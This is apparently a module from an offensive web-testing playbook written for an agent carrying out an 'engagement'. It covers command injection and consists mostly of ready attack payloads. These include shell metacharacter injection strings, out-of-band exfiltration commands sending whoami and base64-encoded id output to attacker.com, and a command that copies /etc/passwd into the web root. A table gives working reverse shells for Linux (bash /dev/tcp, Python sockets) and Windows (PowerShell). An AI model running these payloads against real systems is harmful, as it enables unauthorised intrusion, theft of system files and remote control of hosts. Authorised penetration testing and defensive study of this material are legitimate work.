# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: Command Injection

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Command Injection

Distinguish: **Command injection** (OS command via shell metacharacters) vs **Code injection** (PHP/Java/Python code execution).

#### Testing Methodology

1. Identify parameters that might reach: `system()`, `exec()`, `popen()`, `shell_exec()`, `passthru()`, `Runtime.exec()`, `os.system()`, `subprocess.*`, `ProcessBuilder`, backtick operators
2. Inject shell metacharacters:
   ```
   ; id
   | id
   || id
   & id
   && id
   `id`
   $(id)
   %0aid (newline injection)
   %0d%0aid (CRLF + command)
   '; id;'
   "; id;"
   ```
3. Test timing: Use a timing primitive appropriate to the target OS (`sleep`, `timeout`, `ping -n` on Windows). Select a delay that exceeds the target's normal response-time variance — the specific duration should be based on observed baseline, not a fixed value
4. Test out-of-band: `; nslookup $(whoami).attacker.com` or `; curl http://attacker.com/$(id|base64)` — check your DNS/HTTP logs
5. If output not visible, use output redirection: `; cat /etc/passwd > /var/www/html/out.txt` and fetch via web

#### Platform-Specific Payloads

| OS | List Files | Read File | Reverse Shell |
|---|---|---|---|
| Linux | `; ls -la /` | `; cat /etc/passwd` | `; bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Linux (restricted) | `; printf '%s\n' /*` | `; while read l; do echo $l; done < /etc/passwd` | `; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'` or `; bash -c "exec 5<>/dev/tcp/IP/PORT;cat<&5\|sh>&5 2>&5"` (bash TCP, no external tools) |
| Windows | `& dir C:\` | `& type C:\Windows\win.ini` | `& powershell -c "$c=New-Object System.Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=iex $d 2>&1;$sb2=$sb+'PS '+(pwd).Path+'> ';$t=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($t,0,$t.Length);$s.Flush()}"` |


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
